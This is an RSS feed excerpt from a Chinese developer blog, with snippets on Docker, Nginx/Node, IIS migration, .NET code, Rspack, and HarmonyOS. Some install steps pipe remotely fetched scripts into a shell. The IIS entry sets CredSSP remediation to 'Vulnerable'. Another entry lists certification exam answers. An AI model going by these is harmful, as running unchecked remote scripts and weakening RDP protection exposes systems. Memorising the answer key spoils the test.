// app.js const express = require(&amp;#34;express&amp;#34;); const app = express(); app.use(express.json()); // 解析 JSON 请求 const swaggerJsDoc = require(&amp;#34;swagger-jsdoc&amp;#34;); const swaggerUi = require(&amp;#34;swagger-ui-express&amp;#34;); // Swagger 配置 const swaggerOptions = { swaggerDefinition: { openapi: &amp;#34;3.</description></item><item><title>Rspack Vue3</title><link>https://qfsyso.github.io/posts/rspack-vue3/</link><pubDate>Thu, 07 Nov 2024 00:31:15 +0000</pubDate><guid>https://qfsyso.github.io/posts/rspack-vue3/</guid><description>Rspack+Vue3+TS 项目环境构建到实战Rspack是什么? Rspack是一个基于 Rust 编写的高性能JavaScript 打包工具，它提供对 webpack 生态良好的兼容性能够无缝替换 webpack，并提供闪电般的构建速度。
为什么要做 Rspack 创建 Rspack 的原因，是为了解决在字节跳动维护构建工具时遇到的各种性能问题。在字节跳动内部存在许多巨石应用，它们都具有复杂的构建配置，生产环境的构建需要耗费十几分钟，甚至超过半小时;开发环境的耗时也超过十几分钟。 我们在 webpack 上尝试了多种方法来优化这些巨石应用，但是效果甚微。我们意识到在 webpack 上的优化已经难以为继，必须要从底层改造，才能适应我们的需求。 同时在聆听解决业务各种复杂的构建需求中，我们意识到开发人员对构建工具有以下要求: 快速的 Dev 启动性能 npm run dev 是开发者每天需要运行很多次的命令，但大型项目每次都需和要等待 10分钟，这对于工程师来说非常痛苦，因此优化开发模式下启动的时间至关重要 高效的 Build 性能 npm run bui1d 经常在 CI/CD 环境中运行，它决定了应用生产交付的效率,有些应用在生产环境中需要 20 到 30 分钟的构建时间，如果能缩短这段时间，对开发流程也将非 常有帮助。 灵活的配置 用户工程的配置非常灵活，不够统一。在之前的尝试中，将webpack配置迁移到其他构建工具时，我们遇到了许多问题，因为其他构建工具的配置不如 webpack 灵活。 生产环境的优化能力 在启用 Rspack之前，我们尝试了社区内的各种方案，但它们都面临着一定程度的生产环境负优化，例如拆分包不够精细等。因此，优化生产环境的产物是我们不可放弃的功能。 在确定了这四个需求后，我们调查了社区中的所有技术方案，它们通常都能很好的满足其中个别需求但没有一个方案能同时满足所有条件，因此，我们决定自研 Rspack。
和 webpack 的区别 webpack是目前最为成熟的构建工具，有着活跃的生态，灵活的配置和丰富的功能，但是其最为人诟病的是其性能问题，尤其在一些大型项目上，构建花费的时间可能会达到几分钟甚至几十分钟，&amp;laquo;&amp;lt;性能问题是目前 webpack 最大的短板。因此 Rspack 解决的问题核心就是webpack 的性能问题。 Rspack 比webpack 快得益于如下几方面: Rust 语言优势: Rspack 使用 Rust 语言编写，得益于 Rust的高性能编译器支持， Rust 编译生成的 Native Code 通常比JavaScript 性能更为高效。 高度并行的架构: webpack 受限于JavaScript 对多线程的赢弱支持，导致其很难进行高度的并行化计算，而得益于 Rust语言的并行化的良好支持，Rspack采用了高度并行化的架构，如模块图生成，代码生成等阶段，都是采用多线程并行执行，这使得其编译性能随着 CPU核心数的增长而增长，充分挖掘 CPU的多核优势。 内置大部分的功能: 事实上 webpack 本身的性能足够高效，但是因为 webpack 本身内置了较少的功能，这使得我们在使用 webpack 做现代 Web App 开发时，通常需要配合很多的 plugin 和loader 进行使用，而这些loader和 plugin 往往是性能的瓶颈，而 Rspack 虽然支持loader 和plugin，但是保证绝大部分常用功能都内置在Rspack内，从而减小Spluginlloader 导致的低性能和通信开销问题， 增量编译: 尽管 Rspack 的全量编译足够高效，但是当项目庞大时，全量的编译仍然难以满足 HMR的性能要求，因此在 HMR 阶段，我们采用的是更为高效的增量编译策略，从而保证，无论你的项目多大，其 HMR 的开销总是控制在合理范围内。</description></item><item><title> Loacl IP get Weather</title><link>https://qfsyso.github.io/posts/loacl-ip-get-weather/</link><pubDate>Wed, 06 Nov 2024 06:22:53 +0000</pubDate><guid>https://qfsyso.github.io/posts/loacl-ip-get-weather/</guid><description>通过当前网络IP获取天气~
获取天气的接口 地址： https://weather.sl.al/
参数： https://weather.sl.al/?lat=22.2783&amp;amp;lon=114.1747
&amp;amp;lang=en
lat：纬度
lon：经度
lang：语言
(默认不带 lang 的话为中文)
{ &amp;#34;lat&amp;#34;: &amp;#34;22.2783&amp;#34;, &amp;#34;lon&amp;#34;: &amp;#34;114.1747&amp;#34;, &amp;#34;location&amp;#34;: { &amp;#34;city&amp;#34;: &amp;#34;湾仔&amp;#34;, &amp;#34;region&amp;#34;: &amp;#34;湾仔区&amp;#34; }, &amp;#34;current&amp;#34;: { &amp;#34;temperature&amp;#34;: 22, &amp;#34;feelsLike&amp;#34;: 20, &amp;#34;description&amp;#34;: &amp;#34;阴&amp;#34;, &amp;#34;airQuality&amp;#34;: { &amp;#34;category&amp;#34;: &amp;#34;差&amp;#34;, &amp;#34;statement&amp;#34;: &amp;#34;空气污染已经达到了很高水平，对敏感人群是不健康的。如果您感到呼吸困难或喉咙刺激等症状，应减少户外活动时间。&amp;#34; } }, &amp;#34;sun&amp;#34;: { &amp;#34;duration&amp;#34;: &amp;#34;11 hrs 13 mins&amp;#34;, &amp;#34;sunrise&amp;#34;: &amp;#34;AM6:30&amp;#34;, &amp;#34;sunset&amp;#34;: &amp;#34;PM5:43&amp;#34; }, &amp;#34;hourly&amp;#34;: [ { &amp;#34;time&amp;#34;: &amp;#34;上午7时&amp;#34;, &amp;#34;temperature&amp;#34;: 23, &amp;#34;rainProbability&amp;#34;: &amp;#34;1%&amp;#34; }, { &amp;#34;time&amp;#34;: &amp;#34;上午8时&amp;#34;, &amp;#34;temperature&amp;#34;: 24, &amp;#34;rainProbability&amp;#34;: &amp;#34;1%&amp;#34; }, { &amp;#34;time&amp;#34;: &amp;#34;上午9时&amp;#34;, &amp;#34;temperature&amp;#34;: 25, &amp;#34;rainProbability&amp;#34;: &amp;#34;1%&amp;#34; }, { &amp;#34;time&amp;#34;: &amp;#34;上午10时&amp;#34;, &amp;#34;temperature&amp;#34;: 26, &amp;#34;rainProbability&amp;#34;: &amp;#34;1%&amp;#34; }, { &amp;#34;time&amp;#34;: &amp;#34;上午11时&amp;#34;, &amp;#34;temperature&amp;#34;: 27, &amp;#34;rainProbability&amp;#34;: &amp;#34;1%&amp;#34; }, { &amp;#34;time&amp;#34;: &amp;#34;下午12时&amp;#34;, &amp;#34;temperature&amp;#34;: 27, &amp;#34;rainProbability&amp;#34;: &amp;#34;1%&amp;#34; }, { &amp;#34;time&amp;#34;: &amp;#34;下午1时&amp;#34;, &amp;#34;temperature&amp;#34;: 27, &amp;#34;rainProbability&amp;#34;: &amp;#34;0%&amp;#34; }, { &amp;#34;time&amp;#34;: &amp;#34;下午2时&amp;#34;, &amp;#34;temperature&amp;#34;: 28, &amp;#34;rainProbability&amp;#34;: &amp;#34;0%&amp;#34; }, { &amp;#34;time&amp;#34;: &amp;#34;下午3时&amp;#34;, &amp;#34;temperature&amp;#34;: 28, &amp;#34;rainProbability&amp;#34;: &amp;#34;0%&amp;#34; }, { &amp;#34;time&amp;#34;: &amp;#34;下午4时&amp;#34;, &amp;#34;temperature&amp;#34;: 27, &amp;#34;rainProbability&amp;#34;: &amp;#34;0%&amp;#34; }, { &amp;#34;time&amp;#34;: &amp;#34;下午5时&amp;#34;, &amp;#34;temperature&amp;#34;: 26, &amp;#34;rainProbability&amp;#34;: &amp;#34;0%&amp;#34; }, { &amp;#34;time&amp;#34;: &amp;#34;下午6时&amp;#34;, &amp;#34;temperature&amp;#34;: 26, &amp;#34;rainProbability&amp;#34;: &amp;#34;0%&amp;#34; } ], &amp;#34;daily&amp;#34;: [ { &amp;#34;date&amp;#34;: &amp;#34;2024-11-06&amp;#34;, &amp;#34;high&amp;#34;: 28, &amp;#34;low&amp;#34;: 21, &amp;#34;dayDescription&amp;#34;: &amp;#34;部分晴，天气宜人&amp;#34;, &amp;#34;nightDescription&amp;#34;: &amp;#34;大部分晴，有风&amp;#34;, &amp;#34;rainProbability&amp;#34;: &amp;#34;11%&amp;#34; }, { &amp;#34;date&amp;#34;: &amp;#34;2024-11-07&amp;#34;, &amp;#34;high&amp;#34;: 28, &amp;#34;low&amp;#34;: 20, &amp;#34;dayDescription&amp;#34;: &amp;#34;大部分晴，微风&amp;#34;, &amp;#34;nightDescription&amp;#34;: &amp;#34;部分多云，微风&amp;#34;, &amp;#34;rainProbability&amp;#34;: &amp;#34;19%&amp;#34; }, { &amp;#34;date&amp;#34;: &amp;#34;2024-11-08&amp;#34;, &amp;#34;high&amp;#34;: 28, &amp;#34;low&amp;#34;: 21, &amp;#34;dayDescription&amp;#34;: &amp;#34;大部分晴，天气宜人&amp;#34;, &amp;#34;nightDescription&amp;#34;: &amp;#34;主要为晴&amp;#34;, &amp;#34;rainProbability&amp;#34;: &amp;#34;2%&amp;#34; }, { &amp;#34;date&amp;#34;: &amp;#34;2024-11-09&amp;#34;, &amp;#34;high&amp;#34;: 27, &amp;#34;low&amp;#34;: 21, &amp;#34;dayDescription&amp;#34;: &amp;#34;部分晴，天气宜人&amp;#34;, &amp;#34;nightDescription&amp;#34;: &amp;#34;主要为晴&amp;#34;, &amp;#34;rainProbability&amp;#34;: &amp;#34;2%&amp;#34; }, { &amp;#34;date&amp;#34;: &amp;#34;2024-11-10&amp;#34;, &amp;#34;high&amp;#34;: 28, &amp;#34;low&amp;#34;: 22, &amp;#34;dayDescription&amp;#34;: &amp;#34;晴，天气宜人&amp;#34;, &amp;#34;nightDescription&amp;#34;: &amp;#34;晴朗潮湿&amp;#34;, &amp;#34;rainProbability&amp;#34;: &amp;#34;6%&amp;#34; }, { &amp;#34;date&amp;#34;: &amp;#34;2024-11-11&amp;#34;, &amp;#34;high&amp;#34;: 29, &amp;#34;low&amp;#34;: 24, &amp;#34;dayDescription&amp;#34;: &amp;#34;晴朗潮湿&amp;#34;, &amp;#34;nightDescription&amp;#34;: &amp;#34;主要为晴，暖和潮湿&amp;#34;, &amp;#34;rainProbability&amp;#34;: &amp;#34;1%&amp;#34; }, { &amp;#34;date&amp;#34;: &amp;#34;2024-11-12&amp;#34;, &amp;#34;high&amp;#34;: 26, &amp;#34;low&amp;#34;: 21, &amp;#34;dayDescription&amp;#34;: &amp;#34;晴&amp;#34;, &amp;#34;nightDescription&amp;#34;: &amp;#34;主要为晴&amp;#34;, &amp;#34;rainProbability&amp;#34;: &amp;#34;0%&amp;#34; }, { &amp;#34;date&amp;#34;: &amp;#34;2024-11-13&amp;#34;, &amp;#34;high&amp;#34;: 26, &amp;#34;low&amp;#34;: 20, &amp;#34;dayDescription&amp;#34;: &amp;#34;晴&amp;#34;, &amp;#34;nightDescription&amp;#34;: &amp;#34;晴朗潮湿&amp;#34;, &amp;#34;rainProbability&amp;#34;: &amp;#34;1%&amp;#34; }, { &amp;#34;date&amp;#34;: &amp;#34;2024-11-14&amp;#34;, &amp;#34;high&amp;#34;: 26, &amp;#34;low&amp;#34;: 20, &amp;#34;dayDescription&amp;#34;: &amp;#34;晴朗潮湿&amp;#34;, &amp;#34;nightDescription&amp;#34;: &amp;#34;晴朗潮湿&amp;#34;, &amp;#34;rainProbability&amp;#34;: &amp;#34;2%&amp;#34; }, { &amp;#34;date&amp;#34;: &amp;#34;2024-11-15&amp;#34;, &amp;#34;high&amp;#34;: 26, &amp;#34;low&amp;#34;: 21, &amp;#34;dayDescription&amp;#34;: &amp;#34;晴朗潮湿&amp;#34;, &amp;#34;nightDescription&amp;#34;: &amp;#34;晴朗潮湿&amp;#34;, &amp;#34;rainProbability&amp;#34;: &amp;#34;1%&amp;#34; } ] } 获取经纬度接口 获取当前网络经纬度的免费且稳定的接口有几个选择。这些接口通常提供基于IP地址的服务，能够返回访问者的大致地理位置信息，包括经纬度。请注意，基于IP地址的服务精度有限，特别是在城市范围内，因为它们依赖于ISP提供的数据。以下是一些常用的免费API选项：</description></item><item><title>IIS Web</title><link>https://qfsyso.github.io/posts/iis-web/</link><pubDate>Mon, 04 Nov 2024 01:43:24 +0000</pubDate><guid>https://qfsyso.github.io/posts/iis-web/</guid><description>IIS Web迁移 mstsc远程
安装iis 本地机子开启远程Err 出现“身份验证错误。要求的函数不受支持。远程计算机：xxx，这可能是由于CredSSP加密Oracle修正。
运行 gpedit.msc，选择“计算机配置”-&amp;gt;“管理模板”-&amp;gt;“系统”-&amp;gt;“凭据分配”，选择“加密 Oracle 修正”，改为启用，选择“易受攻击”，OK。
备份web copy web文件夹
备份sql.bak BACKUP DATABASE [zx] TO DISK = &amp;lsquo;C:\zz.bak&amp;rsquo;;
还原sql --err 因为数据库正在使用，所以无法获得对数据库的独占访问权。 ALTER DATABASE zx SET SINGLE_USER WITH ROLLBACK IMMEDIATE; RESTORE DATABASE zx FROM DISK = &amp;#39;c:\webx\zx.bak&amp;#39; with replace, MOVE &amp;#39;zx&amp;#39; TO &amp;#39;C:\Program Files\Microsoft SQL Server\MSSQL10_50.MSSQLSERVER\MSSQL\DATA\zx.mdf&amp;#39;, MOVE &amp;#39;zx_log&amp;#39; TO &amp;#39;C:\Program Files\Microsoft SQL Server\MSSQL10_50.MSSQLSERVER\MSSQL\DATA\zx_log.ldf&amp;#39; --设置MULTI_USER模式 ALTER DATABASE [zx] SET MULTI_USER; iis部署 设置文件夹权限
设置xx.com跳转www.xx.com
&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;configuration&amp;gt; &amp;lt;system.webServer&amp;gt; &amp;lt;httpRedirect enabled=&amp;#34;true&amp;#34; destination=&amp;#34;http://www.</description></item><item><title>HarmonyOS应用开发者初级认证题目(2024.11新版，题目&amp;答案)</title><link>https://qfsyso.github.io/posts/harmonyos%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91%E8%80%85%E5%88%9D%E7%BA%A7%E8%AE%A4%E8%AF%81%E9%A2%98%E7%9B%AE2024.11%E6%96%B0%E7%89%88%E9%A2%98%E7%9B%AE%E7%AD%94%E6%A1%88/</link><pubDate>Thu, 31 Oct 2024 00:36:03 +0000</pubDate><guid>https://qfsyso.github.io/posts/harmonyos%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91%E8%80%85%E5%88%9D%E7%BA%A7%E8%AE%A4%E8%AF%81%E9%A2%98%E7%9B%AE2024.11%E6%96%B0%E7%89%88%E9%A2%98%E7%9B%AE%E7%AD%94%E6%A1%88/</guid><description>HarmonyOS应用开发者认证题目(2024.11新版，题目&amp;amp;答案)
c1 about
判断题
1.“一次开发，多端部署”指的是一个工程，一次开发上架，多端按需部署。为了实现这一目的，HarmonyOS提供了多端开发环境，多端开发能力以及多端分发机制。
正确(True)
2.《鸿蒙生态应用开发白皮书》全面阐释了鸿蒙生态下应用开发核心理念、关键能力以及创新体验，旨在帮助开发者快速、准确、全面的了解鸿蒙开发套件给开发者提供的能力全景和未来的愿景。
正确(True)
3.HUAWEI DevEco Studio是面向HarmonyOS生态的集成开发环境，提供了一站式的HarmonyOS生态应用开发能力。
正确(True)
单选题
1.当用户希望能够在多个设备间来回切换、完成多个任务，开发者可以使用以下哪个核心能力，以便应用不间断地给用户提供服务的能力。
C. 自由流转
2.当您希望获取到最全面、最详细的功能描述、参数说明和权限信息时，应该从（）寻找？
C. API参考
3.应用如需在多个设备上运行，需要适配不同的屏幕尺寸和分辨率、不同的交互方式（如触摸和键盘等）、不同的硬件能力（如内存差异和器件差异等），开发成本较高。“一次开发，多端部署”提供了哪个核心能力降低了多设备应用的开发成本？
B. 多端开发能力
4.如果开发者在原生应用版本的基础上，想要提供多种服务给用户，开发者选择开发场景的最优选是？
B. 开发多个元服务，按需组合为一个复杂的应用
多选题
1.下列哪些选项属于HarmonyOS三大技术理念。
A. 一次开发，多端部署 B. 可分可合，自由流转 C. 统一生态，原生智能
2.用户使用应用的情境发生变化时（例如从室内走到户外、从办公室到车上等），之前使用的设备可能已经不适合继续当前的任务，或者周围有更合适的设备，此时，可以选择使用新的设备来继续当前的任务。以下哪些场景适合使用跨端迁移能力？
A. 在外时手机上编辑邮件，到公司后在2in1设备上继续编辑 B. 在外时手机玩游戏，到家后希望获取更好的视觉体验，在平板上继续玩 C. 在家里智慧屏上看视频，当下需要出门时，可以手机上继续观看 D. 手机视频通话中，到家后家中有智慧屏，可以更沉浸地视频聊天
3.下列哪些说法是正确的。
A. HUAWEI DevEco Studio 提供了设备模拟的能力，解决HarmonyOS生态应用、元服务开发过程中遇到的真机设备不足、无分布式应用调试环境等问题，为开发者提供低成本、易获取的调测验证环境 B. 为了降低性能调优技术难度，HUAWEI DevEco Studio推出了场景化调优工具 DevEco Profiler C. HUAWEI DevEco Studio提供了一系列命令行工具，辅助开发者更高效的管理 SDK 、设备，提升调试、调优的效率 D. HUAWEI DevEco Studio是面向HarmonyOS生态的集成开发环境，提供了一站式的HarmonyOS生态应用开发能力
c2 DevEco Studio
判断题
1.如果代码中涉及到一些网络、数据库、传感器等功能的开发，均可使用预览器进行预览。
错误(False)</description></item><item><title>docker pro</title><link>https://qfsyso.github.io/posts/docker-pro/</link><pubDate>Sat, 26 Oct 2024 22:43:10 +0000</pubDate><guid>https://qfsyso.github.io/posts/docker-pro/</guid><description>docker 运行有趣的项目
Uptime Kuma 简单实用, 主要用来监控 Web 和网络 https://github.com/louislam/uptime-kuma
docker run -d --restart=always -p 3001:3001 -v uptime-kuma:/app/data --name uptime-kuma louislam/uptime-kuma:1 Portainer - 容器管理面板 Portainer 提供了一个简单易用的 Web 界面来管理和监控 Docker 容器、镜像、网络等。你可以通过下面的命令快速启动它：
docker volume create portainer_data docker run -d -p 9000:9000 --name=portainer --restart=always -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer-ce lobechat &amp;lt;在Linux环境下，如何使用Docker部署Lobehub？
在Linux环境下使用Docker部署Lobehub（一个开源的低代码开发平台）涉及几个步骤。 Lobehub 官方并未提供一个直接的Docker镜像，但你可以通过以下步骤来手动创建并运行一个Docker容器，以使用Lobehub。
步骤 1: 安装Docker 确保你的Linux系统上已安装Docker。你可以通过运行以下命令来安装Docker：
# 对于基于Debian的系统（如Ubuntu） sudo apt-get update sudo apt-get install docker.io # 对于基于RHEL的系统（如CentOS） sudo yum install docker # 启动Docker服务 sudo systemctl start docker sudo systemctl enable docker 步骤 2: 拉取Node.</description></item><item><title>android run linux</title><link>https://qfsyso.github.io/posts/android-run-linux/</link><pubDate>Sat, 26 Oct 2024 22:39:32 +0000</pubDate><guid>https://qfsyso.github.io/posts/android-run-linux/</guid><description>在安卓中运行linux AnLinux-App https://github.com/EXALAB/AnLinux-App download anlinux
安装完 选择安装的linux系统
复制启动/安装命令
安装termux（如果没装） https://github.com/termux/termux-app
（安装好了之后，进入termux界面：
执行termux-setup-storage 来申请一下内存卡权限
然后同意就行了，之后执行以下命令：
pkg update &amp;amp;&amp;amp; pkg upgrade） 启动 粘贴运行命令
安装完
./start-debian.sh 启动 debian
查IP su apt update apt install sudo sudo apt install net-tools ifconfig 修改密码 su # 输入当前 root 用户的密码 passwd # 输入新密码 Enter new UNIX password: # 再次输入新密码以确认 Retype new UNIX password: # 确认密码更改成功 passwd: password updated successfully exit linux 命令 1：文件管理 mv命令 – 移动或改名文件 ls命令 – 显示目录中文件及其属性信息 cp命令 – 复制文件或目录 mkdir命令 – 创建目录文件 pwd命令 – 显示当前工作目录的路径 tar命令 – 压缩和解压缩文件 cd命令 – 切换目录 chmod命令 – 改变文件或目录权限 2：文档编辑 cat命令 – 在终端设备上显示文件内容 grep命令 – 强大的文本搜索工具 rm命令 – 删除文件或目录 echo命令 – 输出字符串或提取后的变量值 tail命令 – 查看文件尾部内容 rmdir命令 – 删除空目录文件 sed命令 – 批量编辑文本文件 vi命令 – 文本编辑器 3：系统管理 find命令 – 根据路径和条件搜索指定文件 rpm命令 – RPM软件包管理器 ps命令 – 显示进程状态 startx命令 – 初始化X-window系统 uname命令 – 显示系统内核信息 kill命令 – 杀死进程 resize2fs命令 – 同步文件系统容量到内核 useradd命令 – 创建并设置用户信息 4：磁盘管理 df命令 – 显示磁盘空间使用量情况 fdisk命令 – 管理磁盘分区 lsblk命令 – 查看系统的磁盘使用情况 mkfs.</description></item><item><title>.net orm</title><link>https://qfsyso.github.io/posts/.net-orm/</link><pubDate>Sat, 26 Oct 2024 22:35:57 +0000</pubDate><guid>https://qfsyso.github.io/posts/.net-orm/</guid><description>SqlSugar nuget 安装 SqlSugar
安装 MySql.Data
实体类
[SugarTable(&amp;#34;IMMenu&amp;#34;)] class IMMenu { [SugarColumn(IsPrimaryKey = true, IsIdentity = true)] //id public int id { get; set; } public string name { get; set; } // 其他属性... public override string ToString() { return $&amp;#34;id: {id}, name: {name}&amp;#34;; } } 使用
// 连接字符串 string connectionString = &amp;#34;server=xxx;user=root;password=xxx;database=DB&amp;#34;; // 创建SqlSugar客户端实例 SqlSugarClient db = new SqlSugarClient(new ConnectionConfig() { ConnectionString = connectionString, DbType = DbType.MySql, IsAutoCloseConnection = true, InitKeyType = InitKeyType.</description></item><item><title> .NET ZIP</title><link>https://qfsyso.github.io/posts/.net-zip/</link><pubDate>Thu, 17 Oct 2024 01:03:45 +0000</pubDate><guid>https://qfsyso.github.io/posts/.net-zip/</guid><description>压缩一个目录为 ZIP 文件 using System; using System.IO.Compression; class Program { static void Main() { string startPath = @&amp;#34;c:\example\start&amp;#34;; // 要压缩的目录路径 string zipPath = @&amp;#34;c:\example\result.zip&amp;#34;; // 输出的 ZIP 文件路径 ZipFile.CreateFromDirectory(startPath, zipPath); Console.WriteLine(&amp;#34;压缩完成！&amp;#34;); } } 压缩单个文件到 ZIP 文件 using System; using System.IO; using System.IO.Compression; class Program { static void Main() { string filePath = @&amp;#34;c:\example\file.txt&amp;#34;; // 要压缩的文件路径 string zipPath = @&amp;#34;c:\example\result.zip&amp;#34;; // 输出的 ZIP 文件路径 using (FileStream fs = File.OpenRead(filePath)) using (FileStream zipFs = File.</description></item><item><title>vue3 dialog play aac mp4</title><link>https://qfsyso.github.io/posts/vue3-dialog-play-aac-mp4/</link><pubDate>Wed, 16 Oct 2024 01:29:29 +0000</pubDate><guid>https://qfsyso.github.io/posts/vue3-dialog-play-aac-mp4/</guid><description>vue3 play acc mp4 show png
&amp;lt;template&amp;gt; &amp;lt;div v-if=&amp;#34;scope.row.MsgType == 7 || scope.row.MsgType == 19&amp;#34;&amp;gt; &amp;lt;el-button :type=&amp;#34;playingRowId === scope.row.AutoID ? &amp;#39;warning&amp;#39; : &amp;#39;info&amp;#39;&amp;#34; :disabled=&amp;#34;playingRowId === scope.row.AutoID&amp;#34; @click=&amp;#34;handleD(scope.row.Content, scope.row.MsgType, scope.row.UserID, scope.row.AutoID)&amp;#34; &amp;gt; {{ playingRowId === scope.row.AutoID ? &amp;#39;播放中&amp;#39; : &amp;#39;播放&amp;#39; }} &amp;lt;/el-button&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;!-- MP4 Dialog --&amp;gt; &amp;lt;el-dialog :visible.sync=&amp;#34;dialogVisible&amp;#34; width=&amp;#34;80%&amp;#34; center @close=&amp;#34;handleDialogClose&amp;#34;&amp;gt; &amp;lt;video ref=&amp;#34;videoPlayer&amp;#34; controls autoplay @ended=&amp;#34;handleDialogClose&amp;#34; :src=&amp;#34;mediaSource&amp;#34; style=&amp;#34;width: 100%;&amp;#34; &amp;gt;&amp;lt;/video&amp;gt; &amp;lt;/el-dialog&amp;gt; &amp;lt;/template&amp;gt; JS代码
&amp;lt;script setup&amp;gt; import { ref } from &amp;#39;vue&amp;#39;; import { ElMessage } from &amp;#39;element-plus&amp;#39;; import request from &amp;#39;@/api/request&amp;#39;; // Assuming you use Axios or similar const playingRowId = ref(null); // Tracks the AutoID of the row currently being played const dialogVisible = ref(false); const mediaSource = ref(&amp;#39;&amp;#39;); async function handleD(com, msgt, userid, autoid) { try { // Set the current row&amp;#39;s AutoID as the playing row playingRowId.</description></item><item><title> .net write wwwroot json</title><link>https://qfsyso.github.io/posts/.net-write-wwwroot-json/</link><pubDate>Wed, 16 Oct 2024 01:24:24 +0000</pubDate><guid>https://qfsyso.github.io/posts/.net-write-wwwroot-json/</guid><description>1. 创建一个新的控制器 在Controllers文件夹中创建一个新控制器，例如JsonController.cs。
using Microsoft.AspNetCore.Mvc; using System.IO; using Newtonsoft.Json; namespace Namespace.Controllers { [ApiController] [Route(&amp;#34;[controller]&amp;#34;)] public class JsonController : ControllerBase { private readonly string _jsonFilePath = Path.Combine(Directory.GetCurrentDirectory(), &amp;#34;wwwroot&amp;#34;, &amp;#34;data.json&amp;#34;); // GET: /json [HttpGet] public IActionResult GetJson() { if (!System.IO.File.Exists(_jsonFilePath)) return NotFound(&amp;#34;JSON file not found.&amp;#34;); var jsonContent = System.IO.File.ReadAllText(_jsonFilePath); return Content(jsonContent, &amp;#34;application/json&amp;#34;); } // POST: /json [HttpPost] public IActionResult PostJson([FromBody] DataType data) { var jsonString = JsonConvert.SerializeObject(data); System.IO.File.WriteAllText(_jsonFilePath, jsonString); return Ok(&amp;#34;JSON file updated successfully.</description></item><item><title> .net chacha20 decrypted</title><link>https://qfsyso.github.io/posts/.net-chacha20-decrypted/</link><pubDate>Wed, 16 Oct 2024 01:10:02 +0000</pubDate><guid>https://qfsyso.github.io/posts/.net-chacha20-decrypted/</guid><description>.NET 实现 ChaCha20 加密和解密
add package Install-Package BouncyCastle chacha20 helper using Org.BouncyCastle.Crypto; using Org.BouncyCastle.Crypto.Engines; using Org.BouncyCastle.Crypto.Parameters; using System; public class ChaCha20 { private readonly byte[] key; private readonly byte[] nonce; // Constructor to initialize key and nonce public ChaCha20(byte[] key, byte[] nonce) { if (key.Length != 32) { throw new ArgumentException(&amp;#34;Key must be 32 bytes (256 bits).&amp;#34;); } if (nonce.Length != 12) { throw new ArgumentException(&amp;#34;Nonce must be 12 bytes (96 bits).</description></item><item><title>.net local LLM</title><link>https://qfsyso.github.io/posts/.net-local-llm/</link><pubDate>Wed, 16 Oct 2024 00:11:42 +0000</pubDate><guid>https://qfsyso.github.io/posts/.net-local-llm/</guid><description>ollama ollama --version 比较常用的指令不多，也很简单 列出本地下载的模型
ollama list 查看正在运行的模型
ollama ps 模型标识下载模型到本地
ollama pull 比如我要下载llama2-chinese:7b则使用
ollama pull llama2-chinese:7b 模型标识运行模型，如果已下载则直接运行，如果没下载则先下载再运行。
ollama run 比如我要运行llama2-chinese:7b可以直接运行
ollama run llama2-chinese:7b .net package dotnet add package Ollama --version 1.9.0 //模型名称是必须要传递的，默认 流式输出,如果想一次返回同样的是设置stream为false。 string modelName = &amp;#34;llama2-chinese:7b&amp;#34;; using var ollama = new OllamaApiClient(baseUri: new Uri(&amp;#34;http://127.0.0.1:11434/api&amp;#34;)); Console.WriteLine(&amp;#34;begin~~~&amp;#34;); string userInput = &amp;#34;&amp;#34;; do { Console.WriteLine(&amp;#34;User:&amp;#34;); userInput = Console.ReadLine()!; var enumerable = ollama.Completions.GenerateCompletionAsync(modelName, userInput); Console.WriteLine(&amp;#34;Agent:&amp;#34;); await foreach (var response in enumerable) { Console.</description></item><item><title>debian docker gitlab gitea</title><link>https://qfsyso.github.io/posts/debian-docker-gitlab-gitea/</link><pubDate>Tue, 15 Oct 2024 23:57:02 +0000</pubDate><guid>https://qfsyso.github.io/posts/debian-docker-gitlab-gitea/</guid><description>使用docker部署私有化代码管理~
docker curl -fsSL https://get.docker.com -o get-docker.sh sudo sh get-docker.sh 国内docker 更新系统包索引
sudo apt update 安装一些必要的包，以便于后续添加 apt 仓库：
sudo apt install -y apt-transport-https ca-certificates curl gnupg2 software-properties-common 添加阿里云密钥 添加 GPG 密钥是为了确保软件包的安全性和完整性，避免安装过程中的潜在问题。建议尽量执行这一步，以确保安装过程顺利进行。
curl -fsSL https://mirrors.aliyun.com/docker-ce/linux/debian/gpg | sudo apt-key add - 设置阿里云docker仓库
sudo add-apt-repository &amp;#34;deb [arch=amd64] https://mirrors.aliyun.com/docker-ce/linux/debian $(lsb_release -cs) stable&amp;#34; 再次更新下系统包的索引
sudo apt update 安装docker
sudo apt install -y docker-ce 启动并设置docker的开机自启动
sudo systemctl start docker sudo systemctl enable docker 查看下docker是否安装成功
sudo docker version 最后配置docker的镜像加速推荐阿里云的网址 https://cr.</description></item><item><title> nginx domain 4 nodeserver</title><link>https://qfsyso.github.io/posts/nginx-domain-4-nodeserver/</link><pubDate>Wed, 09 Oct 2024 20:36:34 +0000</pubDate><guid>https://qfsyso.github.io/posts/nginx-domain-4-nodeserver/</guid><description>安装了 Nginx sudo apt update sudo apt install nginx node curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash - sudo apt-get install -y nodejs node -v npm -v //testwebside const http = require(&amp;#39;http&amp;#39;); const hostname = &amp;#39;0.0.0.0&amp;#39;; //127001 const port = 8080; const server = http.createServer((req, res) =&amp;gt; { res.statusCode = 200; res.setHeader(&amp;#39;Content-Type&amp;#39;, &amp;#39;text/plain&amp;#39;); res.end(&amp;#39;Hello World 8080 \n&amp;#39;); }); server.listen(port, hostname, () =&amp;gt; { console.log(`Server running at http://${hostname}:${port}/`); }); 9090 const port = 9090;</description></item><item><title> .NET build release 4 linux</title><link>https://qfsyso.github.io/posts/.net-build-release-4-linux/</link><pubDate>Sun, 29 Sep 2024 11:52:15 +0000</pubDate><guid>https://qfsyso.github.io/posts/.net-build-release-4-linux/</guid><description>在项目中使用 dotnet publish 命令来发布应用程序。
将发布的应用程序文件夹复制到 Linux 服务器上。
在 Linux 服务器上安装 .NET 运行时，如果应用是 self-contained（独立部署）的。
使用 systemd 创建一个服务单元文件来管理应用作为服务运行。
启动应用程序服务。
发布应用程序：
dotnet publish -c Release -o ./publish 将发布文件夹复制到 Linux 服务器：
scp -r ./publish [user]@[host]:/var/www/myapp 运行
dotnet myapp.dll 创建 systemd 服务文件 /etc/systemd/system/myapp.service：
